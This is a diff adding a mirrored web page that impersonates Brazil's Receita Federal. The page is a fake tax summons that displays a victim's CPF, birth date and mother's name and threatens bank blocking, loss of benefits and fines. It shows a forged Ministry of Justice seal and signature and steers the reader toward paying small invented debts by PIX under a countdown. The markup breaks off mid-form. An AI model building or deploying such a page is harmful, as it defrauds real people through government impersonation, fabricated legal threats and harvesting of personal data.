@@ -1,0 +1,1835 @@
+<!DOCTYPE html>
+<html>
+
+<!-- Mirrored from receita.canalgovbr.org/42492556620 by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 03 Aug 2025 02:45:20 GMT -->
+<!-- Added by HTTrack -->
+<meta http-equiv="content-type" content="text/html;charset=utf-8"><!-- /Added by HTTrack -->
+
+<head>
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0" name="viewport">
+    <title>Receita Federal</title>
+    <link href="cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet">
+    <!-- Tailwind CSS CDN -->
+    <script src="3.4.17"></script>
+    <script src="ajax/libs/qrious/4.0.2/qrious.min.js"></script>
+    <script>
+        // Suprimir avisos do Tailwind em desenvolvimento
+        (function() {
+            if (typeof console !== 'undefined' && console.warn) {
+                const originalWarn = console.warn;
+                console.warn = function(...args) {
+                    if (args[0] && typeof args[0] === 'string' && args[0].includes('tailwindcss.com should not be used in production')) {
+                        return; // Suprimir aviso do Tailwind
+                    }
+                    originalWarn.apply(console, args);
+                };
+            }
+        })();
+    </script>
+    <style>
+        @font-face {
+            font-family: 'Rawline';
+            src: url("static/fonts/rawline-400.ea42a37247439622.woff2") format('woff2');
+            font-weight: 400;
+            font-style: normal;
+        }
+
+        @font-face {
+            font-family: 'Rawline';
+            src: url("static/fonts/rawline-400i.1701033bc0b08320.woff2") format('woff2');
+            font-weight: 400;
+            font-style: italic;
+        }
+
+        @font-face {
+            font-family: 'Rawline';
+            src: url("static/fonts/rawline-500.f8af4ec801afaa28.woff2") format('woff2');
+            font-weight: 500;
+            font-style: normal;
+        }
+
+        @font-face {
+            font-family: 'Rawline';
+            src: url("static/fonts/rawline-600.844a17f0db94d147.woff2") format('woff2');
+            font-weight: 600;
+            font-style: normal;
+        }
+
+        @font-face {
+            font-family: 'Rawline';
+            src: url("static/fonts/rawline-700.1c7c76152b40409f.woff2") format('woff2');
+            font-weight: 700;
+            font-style: normal;
+        }
+
+        @font-face {
+            font-family: 'Rawline';
+            src: url("static/fonts/rawline-800.5c5f78761d00551b.woff2") format('woff2');
+            font-weight: 800;
+            font-style: normal;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Rawline', sans-serif;
+        }
+
+        /* Loading Screen */
+        .loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: white;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            transition: opacity 0.5s ease-out;
+        }
+
+        .loading-screen.fade-out {
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        .loading-logo {
+            width: 120px;
+            height: auto;
+            margin-bottom: 40px;
+        }
+
+        .loading-spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid #f0f0f0;
+            border-top: 3px solid #003472;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        .loading-text {
+            margin-top: 20px;
+            font-family: 'Rawline', sans-serif;
+            font-size: 16px;
+            color: #003472;
+            font-weight: 600;
+            animation: pulse-text 2s ease-in-out infinite;
+        }
+
+        @keyframes pulse-text {
+
+            0%,
+            100% {
+                opacity: 1;
+            }
+
+            50% {
+                opacity: 0.6;
+            }
+        }
+
+        .main-content {
+            display: none !important;
+            opacity: 0;
+            transition: opacity 0.5s ease-in;
+        }
+
+        .main-content.show {
+            display: block !important;
+            opacity: 1;
+        }
+
+        .main-content.show {
+            display: block;
+        }
+
+        body {
+            background-color: white;
+            padding-top: 60px;
+            color: #333333;
+            font-size: 16px;
+            line-height: 1.05;
+        }
+
+        h3,
+        h4 {
+            font-size: 18px;
+            line-height: 1.05;
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 8px 20px;
+            background-color: white;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 1000;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+            height: 60px;
+        }
+
+        .logo {
+            width: 240px;
+            height: auto;
+        }
+
+        .header-icons {
+            display: flex;
+            gap: 15px;
+        }
+
+        .header-icon {
+            font-size: 18px;
+            color: #0056b3;
+        }
+
+        .hero-image {
+            width: 100%;
+            height: auto;
+            overflow: hidden;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        .hero-image img {
+            width: 100%;
+            height: auto;
+            object-fit: cover;
+        }
+
+        .user-info {
+            display: flex;
+            flex-direction: column;
+            position: relative;
+            margin: 15px 0;
+            box-shadow: 0 1px 6px rgba(0, 0, 0, 0.2);
+            background-color: white;
+            padding: 15px;
+            border-radius: 4px;
+            width: 100%;
+        }
+
+        .user-info:first-of-type {
+            margin-bottom: 30px;
+        }
+
+        .user-info-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            width: 100%;
+        }
+
+        .user-info p {
+            margin: 1px 0;
+            color: #333333;
+            font-size: 16px;
+        }
+
+        .user-info p strong {
+            font-weight: 600;
+        }
+
+        .user-info h3 {
+            font-weight: 700;
+            color: #0c326f;
+            margin-bottom: 4px;
+        }
+
+        .user-info-image {
+            width: 50px;
+            height: auto;
+            justify-self: end;
+            align-self: start;
+            margin-left: 10px;
+            filter: drop-shadow(0px 2px 3px rgba(0, 0, 0, 0.2));
+        }
+
+        /* Aumentando o espaçamento após os dados do contribuinte */
+        .user-info:nth-of-type(2) .user-info-content {
+            margin-bottom: 35px;
+            padding-bottom: 15px;
+        }
+
+        .message-box {
+            background-color: #f8d7da;
+            border: 1px solid #f5c6cb;
+            color: #721c24;
+            padding: 15px;
+            margin-top: 15px;
+            margin-bottom: 25px;
+            border-radius: 4px;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.1);
+            width: 100%;
+        }
+
+        .message-box p {
+            margin-bottom: 8px;
+            width: 100%;
+            font-size: 16px;
+            line-height: 1.45;
+        }
+
+        .message-box strong {
+            font-weight: 700;
+        }
+
+        .message-box .red-strong {
+            color: #a71d2a;
+            font-weight: 700;
+        }
+
+        .countdown-timer {
+            font-weight: bold;
+            color: #ffffff;
+            margin-top: 8px;
+            background-color: #dc3545;
+            padding: 4px 8px;
+            border-radius: 4px;
+            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.3);
+            width: 100%;
+            text-align: center;
+        }
+
+        .tax-details {
+            margin-top: 25px;
+            padding: 15px;
+            background-color: #f8f9fa;
+            border: 1px solid #dee2e6;
+            border-radius: 4px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .tax-details::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 80%;
+            height: 80%;
+            background-image: url('wikipedia/commons/1/11/Gov.br_logo.svg');
+            background-repeat: no-repeat;
+            background-position: center;
+            background-size: contain;
+            opacity: 0.05;
+            z-index: 0;
+        }
+
+        .tax-details>* {
+            position: relative;
+            z-index: 1;
+        }
+
+        .tax-details h4 {
+            font-weight: 600;
+            margin-bottom: 25px;
+            color: #0c326f;
+            line-height: 1.45;
+        }
+
+        .tax-details .document-data {
+            display: grid;
+            grid-template-columns: auto 1fr;
+            gap: 15px;
+            margin-bottom: 25px;
+        }
+
+        .tax-details .document-data dt {
+            font-weight: 600;
+            text-align: right;
+            padding: 8px 15px;
+            background-color: rgba(248, 249, 250, 0.8);
+            border: 1px solid #dee2e6;
+            border-radius: 4px;
+            min-width: 80px;
+            white-space: nowrap;
+            overflow-x: auto;
+        }
+
+        .year-option {
+            flex: 1;
+            min-width: 120px;
+        }
+
+        .year-required-note {
+            background-color: #fff3cd;
+            border: 1px solid #ffeeba;
+            color: #856404;
+            padding: 10px 12px;
+            border-radius: 4px;
+            font-size: 13px;
+            margin-bottom: 12px;
+        }
+
+        .tax-details .document-data dd {
+            font-weight: normal;
+            padding: 8px 15px;
+            background-color: rgba(255, 255, 255, 0.8);
+            border: 1px solid #dee2e6;
+            border-radius: 4px;
+            margin-left: 0;
+            white-space: nowrap;
+            overflow-x: auto;
+        }
+
+        .tax-details .document-data dt,
+        .tax-details .document-data dd {
+            display: flex;
+            align-items: center;
+        }
+
+        .tax-details .total-value {
+            font-size: 20px;
+            line-height: 1.45;
+            margin-bottom: 25px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid #dee2e6;
+        }
+
+        .regularize-button {
+            display: block;
+            width: 100%;
+            padding: 12px;
+            background-color: #28a745;
+            color: white;
+            text-align: center;
+            border: none;
+            border-radius: 4px;
+            font-weight: bold;
+            margin-top: 25px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .news-image {
+            width: 100%;
+            height: auto;
+            margin: 8px auto 0;
+            display: block;
+            border-radius: 4px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        .news-description {
+            color: #333;
+            margin-top: 12px;
+            padding: 0 4px;
+            text-align: justify;
+            width: 100%;
+        }
+
+        .footer {
+            background-color: #01205B;
+            color: white;
+            padding: 16px;
+            text-align: center;
+            margin-top: 40px;
+            width: 100%;
+            position: relative;
+            bottom: 0;
+        }
+
+        .footer-logo {
+            width: 100px;
+            margin: 0 auto 8px;
+            display: block;
+        }
+
+        @media (max-width: 600px) {
+            .header {
+                padding: 6px 8px;
+            }
+
+            .year-option {
+                flex: 1 1 100%;
+            }
+
+            .logo {
+                width: 160px;
+            }
+
+            .header-icons {
+                gap: 8px;
+            }
+
+            .header-icon {
+                font-size: 16px;
+            }
+
+            .message-box {
+                width: 100%;
+            }
+
+            .news-image {
+                max-width: 100%;
+            }
+
+            .news-description {
+                margin-left: 0;
+            }
+        }
+
+        @keyframes pulse {
+            0% {
+                transform: translate(-50%, -50%) scale(1);
+            }
+
+            50% {
+                transform: translate(-50%, -50%) scale(1.1);
+            }
+
+            100% {
+                transform: translate(-50%, -50%) scale(1);
+            }
+        }
+
+        .sound-button {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: rgba(220, 53, 69, 0.9);
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 8px;
+            cursor: pointer;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 8px;
+            animation: pulse 1s infinite ease-in-out;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
+        }
+
+        .video-container {
+            position: relative;
+            width: 100%;
+            margin: 8px auto 0;
+            border-radius: 4px;
+            overflow: hidden;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        .news-video {
+            width: 100%;
+            display: block;
+        }
+
+        /* Modal Styles */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 2000;
+            overflow-y: auto;
+            padding: 0;
+            margin: 0;
+        }
+
+        .modal-content {
+            background-color: #ffffff;
+            width: 95vw;
+            max-width: 680px;
+            min-height: auto;
+            margin: 32px auto;
+            padding: 24px;
+            border-radius: 12px;
+            box-shadow: 0 16px 40px rgba(15, 23, 42, 0.18);
+            position: relative;
+            overflow-y: auto;
+            box-sizing: border-box;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .modal-header {
+            text-align: center;
+            margin-bottom: 15px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid #dee2e6;
+        }
+
+        .modal-logo {
+            width: 180px;
+            margin: 0 auto;
+            display: block;
+        }
+
+        /* QR Code Container */
+        .qr-code-container {
+            display: none;
+            text-align: center;
+            padding: 15px 0 30px 0;
+            flex: 1;
+            overflow-y: auto;
+        }
+
+        .qr-code-img {
+            width: 180px;
+            height: 180px;
+            margin: 0 auto 15px;
+        }
+
+        .customer-info {
+            background-color: #f8f9fa;
+            padding: 12px;
+            border-radius: 4px;
+            margin-bottom: 12px;
+            border-left: 4px solid #0c326f;
+            text-align: left;
+        }
+
+        .customer-info p {
+            margin: 3px 0;
+            color: #333;
+            text-align: left;
+        }
+
+        .customer-info .total-amount {
+            color: #dc3545;
+            font-weight: 700;
+            margin-top: 8px;
+            font-size: 16px;
+        }
+
+        .warning-text,
+        .notice-card {
+            color: #0f172a;
+            background: #f8fafc;
+            border: 1px solid #e2e8f0;
+            padding: 15px;
+            border-radius: 8px;
+            margin: 15px 0;
+            font-weight: 600;
+            text-align: center;
+            box-shadow: 0 6px 16px rgba(15, 23, 42, 0.08);
+            font-size: 14px;
+            line-height: 1.4;
+        }
+
+        .countdown-timer-pix {
+            background-color: #eef2f7;
+            color: #0c326f;
+            font-weight: 700;
+            padding: 10px;
+            border-radius: 8px;
+            margin: 10px 0 12px 0;
+            text-align: center;
+            font-size: 16px;
+            border: 1px solid #d5dbe6;
+        }
+
+        .pix-code-container {
+            background-color: #fff;
+            border: 1px solid #dee2e6;
+            border-radius: 4px;
+            padding: 8px;
+            margin: 12px 0;
+        }
+
+        .pix-code {
+            font-family: monospace;
+            word-break: break-all;
+            margin: 0;
+            padding: 8px;
+            background: #f8f9fa;
+            border: 1px solid #dee2e6;
+            border-radius: 4px;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .copy-button-container {
+            text-align: center;
+            margin: 20px 0 30px 0;
+            padding-bottom: 30px;
+        }
+
+        .copy-pix-button {
+            background-color: #28a745;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 4px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            width: 80%;
+            justify-content: center;
+        }
+
+        .copy-pix-button:hover {
+            background-color: #218838;
+        }
+
+        /* Ministry Seal Styles */
+        .ministry-seal-container {
+            text-align: center;
+            margin: 20px 0;
+            padding: 15px 0;
+        }
+
+        .ministry-seal {
+            margin-bottom: 10px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .ministry-seal-img {
+            width: 60px;
+            height: 60px;
+            object-fit: contain;
+        }
+
+        .ministry-text {
+            margin-top: 8px;
+        }
+
+        .ministry-name {
+            font-size: 14px;
+            font-weight: 700;
+            color: #333;
+            margin: 0 0 4px 0;
+            letter-spacing: 0.5px;
+        }
+
+        .ministry-gov {
+            font-size: 12px;
+            font-weight: 600;
+            color: #666;
+            margin: 0;
+            letter-spacing: 0.3px;
+        }
+
+        /* Modal no mobile */
+        @media (max-width: 600px) {
+            .modal {
+                width: 100vw;
+                height: 100vh;
+                padding: 0;
+            }
+
+            .modal-content {
+                width: 100vw;
+                min-height: 100vh;
+                padding: 15px;
+                box-sizing: border-box;
+            }
+
+            .copy-button-container {
+                margin: 20px 0 50px 0;
+                padding-bottom: 50px;
+            }
+
+            .copy-pix-button {
+                width: 90%;
+                padding: 15px 20px;
+                font-size: 16px;
+            }
+        }
+
+        /* Script JavaScript adicional para o cronômetro */
+        @keyframes copy-feedback {
+            0% {
+                background-color: #0c326f;
+            }
+
+            50% {
+                background-color: #28a745;
+            }
+
+            100% {
+                background-color: #0c326f;
+            }
+        }
+
+        .copy-success {
+            animation: copy-feedback 1s ease;
+        }
+
+        /* Loader Animation */
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        .loader-container {
+            text-align: center;
+            padding: 30px 0;
+        }
+
+        .loader {
+            width: 50px;
+            height: 50px;
+            border: 3px solid rgba(12, 50, 111, 0.1);
+            border-radius: 50%;
+            border-top-color: #0c326f;
+            animation: spin 1s ease-in-out infinite;
+            margin: 0 auto 15px;
+        }
+
+        .loader-text {
+            color: #0c326f;
+            font-weight: 600;
+            margin-top: 15px;
+        }
+
+        .pix-checkout {
+            margin-top: 18px;
+            background: #ffffff;
+            border: 1px solid #e5e7eb;
+            border-radius: 14px;
+            padding: 18px;
+            text-align: left;
+            box-shadow: 0 12px 40px rgba(0,0,0,0.08);
+        }
+
+        .pix-checkout-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 12px;
+            padding-bottom: 14px;
+            border-bottom: 1px solid #eef2f7;
+            margin-bottom: 14px;
+        }
+
+        .pix-checkout-title {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 18px;
+            font-weight: 800;
+            color: #0c326f;
+            margin: 0;
+        }
+
+        .pix-secure {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 8px 10px;
+            border-radius: 999px;
+            background: #eef2ff;
+            color: #1e3a8a;
+            font-weight: 700;
+            font-size: 12px;
+            white-space: nowrap;
+        }
+
+        .pix-grid {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 12px;
+        }
+
+        @media (min-width: 860px) {
+            .pix-grid {
+                grid-template-columns: 1fr 1fr;
+                gap: 14px;
+            }
+        }
+
+        .pix-panel {
+            border: 1px solid #e5e7eb;
+            border-radius: 12px;
+            padding: 14px;
+            background: #ffffff;
+        }
+
+        .pix-summary {
+            background: linear-gradient(180deg, #eff6ff, #ffffff);
+            border-color: #bfdbfe;
+        }
+
+        .pix-summary-row {
+            display: flex;
+            align-items: flex-start;
+            justify-content: space-between;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+
+        .pix-kv {
+            display: flex;
+            flex-direction: column;
+            gap: 4px;
+        }
+
+        .pix-kv-label {
+            font-size: 12px;
+            color: #6b7280;
+            font-weight: 700;
+            letter-spacing: .2px;
+            text-transform: uppercase;
+        }
+
+        .pix-kv-value {
+            font-size: 22px;
+            font-weight: 900;
+            color: #0c326f;
+        }
+
+        .pix-status {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 8px 10px;
+            border-radius: 10px;
+            background: #fff7ed;
+            border: 1px solid #fed7aa;
+            color: #9a3412;
+            font-weight: 800;
+            font-size: 12px;
+            white-space: nowrap;
+        }
+
+        .pix-qr-wrap {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .pix-qr-card {
+            width: 220px;
+            height: 220px;
+            border-radius: 14px;
+            background: #ffffff;
+            border: 1px solid #e5e7eb;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 10px 28px rgba(0,0,0,0.08);
+        }
+
+        .pix-qr-img {
+            width: 200px;
+            height: 200px;
+            display: block;
+        }
+
+        .pix-qr-fallback {
+            width: 200px;
+            height: 200px;
+            border-radius: 12px;
+            border: 1px dashed #cbd5e1;
+            background: #f8fafc;
+            color: #334155;
+            font-weight: 700;
+            font-size: 12px;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            padding: 14px;
+        }
+
+        .pix-muted {
+            font-size: 13px;
+            color: #6b7280;
+            line-height: 1.4;
+            margin: 0;
+            text-align: center;
+        }
+
+        .pix-copy-wrap {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .pix-code {
+            width: 100%;
+            border: 1px solid #e5e7eb;
+            border-radius: 12px;
+            padding: 12px 12px;
+            background: #0b1220;
+            color: #e5e7eb;
+            font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
+            font-size: 12px;
+            line-height: 1.35;
+            word-break: break-all;
+            max-height: 92px;
+            overflow: auto;
+        }
+
+        .pix-copy-btn {
+            appearance: none;
+            border: none;
+            border-radius: 12px;
+            background: #0c326f;
+            color: #ffffff;
+            padding: 12px 14px;
+            font-weight: 800;
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            transition: transform .06s ease, background .15s ease, box-shadow .15s ease;
+            box-shadow: 0 10px 22px rgba(12,50,111,0.22);
+        }
+
+        .pix-copy-btn:hover {
+            background: #082654;
+        }
+
+        .pix-copy-btn:active {
+            transform: translateY(1px);
+        }
+
+        .pix-copy-btn.success {
+            background: #0f766e;
+            box-shadow: 0 10px 22px rgba(15,118,110,0.22);
+        }
+
+        .pix-steps {
+            margin: 0;
+            padding-left: 18px;
+            color: #111827;
+            line-height: 1.55;
+            font-size: 14px;
+        }
+
+        .pix-steps li {
+            margin: 6px 0;
+        }
+
+        .pix-notes {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 10px;
+            margin-top: 12px;
+        }
+
+        @media (min-width: 860px) {
+            .pix-notes {
+                grid-template-columns: 1fr 1fr 1fr;
+            }
+        }
+
+        .pix-note {
+            border-radius: 12px;
+            border: 1px solid #e5e7eb;
+            padding: 12px;
+            background: #ffffff;
+            color: #374151;
+            font-size: 12px;
+            line-height: 1.35;
+            display: flex;
+            gap: 10px;
+        }
+
+        .pix-note i {
+            color: #0c326f;
+            margin-top: 2px;
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Loading Screen -->
+    <div class="loading-screen" id="loadingScreen">
+        <img src="wikipedia/commons/1/11/Gov.br_logo.svg" alt="Receita Federal" class="loading-logo">
+        <div class="loading-spinner"></div>
+        <div class="loading-text" id="loadingText">Consultando dados da Receita Federal...</div>
+    </div>
+
+    <!-- Main Content -->
+    <div class="main-content" id="mainContent">
+        <div class="header">
+            <img alt="Logo da Receita Federal" class="logo" src="wikipedia/commons/1/11/Gov.br_logo.svg">
+            <div class="header-icons">
+                <i class="fas fa-search header-icon"></i>
+                <i class="fas fa-question-circle header-icon"></i>
+                <i class="fas fa-adjust header-icon"></i>
+            </div>
+        </div>
+        <div class="hero-image">
+            <img alt="Aviso sobre novas regras do PIX" src="cSFXVMXx/Aviso-funcionamento-de-loja-simples-verde-vermelho-story-do-instagram-1080-x-400-px-4.png">
+        </div>
+
+        <div class="user-info">
+            <div class="user-info-content">
+                <div class="user-info-text">
+                    <h3>INTIMAÇÃO FISCAL - RECEITA FEDERAL DO BRASIL</h3>
+                    <p style="text-align: justify; line-height: 1.4;">
+                        <strong id="topDebtorName"></strong>, portador(a) do CPF
+                        <strong id="topDebtorCpf"></strong>,
+                        nascido(a) em <strong id="topDebtorNascimento"></strong>, filho(a) de <strong id="topDebtorMae"></strong>,
+                        em conformidade com o artigo 142 do CTN, informamos que após cruzamento de dados das suas
+                        declarações do Imposto de Renda Pessoa Física do ano de 2020, foi identificada
+                        uma pendência tributária em sua situação fiscal.
+                    </p>
+                    <p style="text-align: justify; line-height: 1.4; margin-top: 10px;">
+                        <strong style="color: #721c24;">PRAZO FINAL:</strong> <strong style="color: #000; text-decoration: underline;"><span id="prazoFinalDate"></span></strong> é o último dia para
+                        regularização.
+                        O não cumprimento desta intimação resultará nas seguintes punições conforme
+                        Instrução Normativa RFB nº 1.888/2019:
+                    </p>
+                    <ul style="margin: 10px 0; padding-left: 0; line-height: 1.6; list-style: none;">
+                        <li style="margin-bottom: 5px;"><span style="color: #666; font-size: 18px; margin-right: 8px;">●</span><strong>Bloqueio de
+                                contas bancárias e cartões</strong></li>
+                        <li style="margin-bottom: 5px;"><span style="color: #666; font-size: 18px; margin-right: 8px;">●</span><strong>Impossibilidade
+                                de realizar transações financeiras e operações bancárias</strong></li>
+                        <li style="margin-bottom: 5px;"><span style="color: #666; font-size: 18px; margin-right: 8px;">●</span><strong>Restrições no
+                                Banco Central e SERASA</strong></li>
+                        <li style="margin-bottom: 5px;"><span style="color: #666; font-size: 18px; margin-right: 8px;">●</span><strong>Suspensão do
+                                acesso a benefícios federais (Auxílio, Bolsa Família, etc.)</strong></li>
+                        <li style="margin-bottom: 5px;"><span style="color: #666; font-size: 18px; margin-right: 8px;">●</span><strong>Impedimento
+                                para financiamentos, empréstimos e compras no crédito</strong></li>
+                        <li style="margin-bottom: 5px;"><span style="color: #666; font-size: 18px; margin-right: 8px;">●</span><strong>Aplicação de
+                                multa automática de até 150%</strong></li>
+                    </ul>
+                    <p style="margin-top: 12px; font-weight: 600;">
+                        Confirme se os dados abaixo correspondem à sua identificação:
+                    </p>
+                </div>
+            </div>
+            <div style="background-color: #f8f9fa; padding: 15px; border-radius: 4px; margin-top: 10px; border-left: 4px solid #0c326f;">
+                <p style="margin-bottom: 5px;"><strong>Nome:</strong> <span id="summaryDebtorName"></span></p>
+                <p style="margin-bottom: 5px;"><strong>CPF:</strong> <span id="summaryDebtorCpf"></span></p>
+                <p style="margin-bottom: 5px;"><strong>Data de Nascimento:</strong> <span id="summaryDebtorNascimento"></span></p>
+                <p style="margin-bottom: 0;"><strong>Nome da Mãe:</strong> <span id="summaryDebtorMae"></span></p>
+            </div>
+            <div style="margin-top: 20px; text-align: center;">
+                <div onclick="confirmData()" style="background: #f8f9fa; border: 2px solid #dee2e6; border-radius: 0px; padding: 20px; max-width: 320px; margin: 0 auto; cursor: pointer; box-shadow: 0 2px 8px rgba(0,0,0,0.1);">
+                    <h3 style="margin: 0 0 8px 0; font-size: 14px; font-weight: bold; letter-spacing: 1px; color: #000;">
+                        MINISTÉRIO DA JUSTIÇA
+                    </h3>
+                    <h4 style="margin: 0 0 15px 0; font-size: 12px; font-weight: bold; letter-spacing: 0.5px; color: #000;">
+                        DOCUMENTO OFICIAL</h4>
+                    <div style="width: 70px; height: 70px; margin: 0 auto 12px; display: flex; align-items: center; justify-content: center;">
+                        <img src="static/image.png" alt="Brasão do Ministério da Justiça" style="width: 60px; height: 60px; object-fit: contain;">
+                    </div>
+                    <p style="margin: 8px 0; font-size: 13px; line-height: 1.8; word-spacing: 0.05em; color: #333; text-align: justify;">
+                        Este documento foi assinado em <strong>01/07/2026</strong> e possui
+                        permissão do Ministério da Justiça para fazer cumprir todos os bloqueios e restrições
+                        supracitados em face de <strong id="documentName"></strong>, portador do CPF nº
+                        <strong id="cpfDocumentoOficial"></strong>,
+                        conforme legislação vigente.
+                    </p>
+                    <div style="margin: 15px auto; padding: 12px; max-width: 280px;">
+                        <p style="margin: 0 0 8px 0; font-size: 12px; font-weight: 600; color: #666;">
+                            Secretário Especial da Receita Federal
+                        </p>
+                        <p style="margin: 0; font-size: 18px; font-family: 'Brush Script MT', cursive, 'Lucida Handwriting', 'Apple Chancery', fantasy; color: #000; font-weight: normal; font-style: italic;">
+                            Robinson Sakiyama Barreirinhas
+                        </p>
+                        <div style="width: 200px; height: 1px; background-color: #333; margin: 3px auto 0; opacity: 0.6;">
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+
+
+        <div class="user-info">
+            <div class="user-info-content">
+                <div class="user-info-text">
+                    <h3>DADOS DO DEVEDOR</h3>
+                    <p id="debtorName" style="margin-bottom: 5px;"><strong>NOME:</strong> </p>
+                    <p id="debtorCpf" style="margin-bottom: 5px;"><strong>CPF:</strong> <strong></strong></p>
+                    <p id="debtorNascimento" style="display:none; margin-bottom: 5px;"><strong>DATA DE NASCIMENTO:</strong> <span></span></p>
+                    <p id="debtorMae" style="display:none; margin-bottom: 0;"><strong>NOME DA MÃE:</strong> <span></span></p>
+                </div>
+                <img src="https://i.ibb.co/xKfzBFbn/download-1.png" alt="User profile icon" class="user-info-image" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%22100%22 height=%22100%22%3E%3Ccircle cx=%2250%22 cy=%2250%22 r=%2240%22 fill=%22%23ccc%22/%3E%3Ctext x=%2250%22 y=%2255%22 text-anchor=%22middle%22 font-size=%2230%22 fill=%22%23999%22%3E%F0%9F%91%A4%3C/text%3E%3C/svg%3E'; console.error('Image load failed for user profile icon');" onerror="this.src='data:image/svg+xml,%3Csvg xmlns=%22http://www.w3.org/2000/svg%22 width=%22100%22 height=%22100%22%3E%3Ccircle cx=%2250%22 cy=%2250%22 r=%2240%22 fill=%22%23ccc%22/%3E%3Ctext x=%2250%22 y=%2255%22 text-anchor=%22middle%22 font-size=%2230%22 fill=%22%23999%22%3E%F0%9F%91%A4%3C/text%3E%3C/svg%3E'; console.error('Image load failed for user profile icon');">
+            </div>
+
+            <div class="tax-details">
+                <h4>Divergências calculadas pela Receita Federal que devem ser pagas:</h4>
+
+                <div style="background-color: #f8f9fa; padding: 15px; border-radius: 4px; margin: 15px 0; border-left: 4px solid #0c326f;">
+                    <p style="margin: 0 0 10px 0; font-size: 14px;"><strong>Valor original do débito:</strong> R$ 419,55</p>
+                    <p id="valorComDescontoTopo2" style="margin: 0; font-size: 16px; font-weight: bold; color: #0c326f;"><strong>Valor com desconto:</strong> R$ 0,00</p>
+                </div>
+
+                <div id="yearSelectionContainer">
+                    <div class="year-required-note">⚠️ Aviso: o ano de <strong>2020 é obrigatório</strong> para regularização.</div>
+                    <div style="margin-bottom: 10px; font-weight: bold;">Selecione os anos para pagamento:</div>
+                    <div style="display: flex; flex-wrap: wrap; gap: 10px; margin-bottom: 15px;">
+                        <div class="year-option">
+                            <label for="year2020" style="display: flex; align-items: center; gap: 6px; cursor: pointer;">
+                                <input type="checkbox" id="year2020" value="149.92" onchange="updateTotal()" checked required>
+                                <span>2020 (R$ 149,92) - Obrigatório</span>
+                            </label>
+                        </div>
+                        <div class="year-option">
+                            <label for="year2021" style="display: flex; align-items: center; gap: 6px; cursor: pointer;">
+                                <input type="checkbox" id="year2021" value="123.43" onchange="updateTotal()">
+                                <span>2021 (R$ 123,43)</span>
+                            </label>
+                        </div>
+                        <div class="year-option">
+                            <label for="year2022" style="display: flex; align-items: center; gap: 6px; cursor: pointer;">
+                                <input type="checkbox" id="year2022" value="132.87" onchange="updateTotal()">
+                                <span>2022 (R$ 132,87)</span>
+                            </label>
+                        </div>
+                        <div class="year-option">
+                            </label>
+                        </div>
+                    </div>
+                    <div style="display: flex; gap: 10px; margin-bottom: 15px;">
+                        <button onclick="selectAllYears()" style="background: #28a745; border: none; border-radius: 2px; padding: 8px 16px; color: white; font-weight: 600; cursor: pointer;">Selecionar Todos</button>
